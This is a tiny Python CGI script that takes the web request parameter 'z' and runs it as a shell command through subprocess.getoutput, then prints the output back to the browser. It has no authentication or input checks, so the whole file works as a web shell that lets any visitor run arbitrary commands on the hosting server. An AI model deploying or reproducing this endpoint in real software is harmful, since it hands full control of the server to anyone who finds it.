#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
y = cgi.FieldStorage()
cmd= y.getvalue("z")

import subprocess

a=subprocess.getoutput(cmd)
print("hello")
print(a)

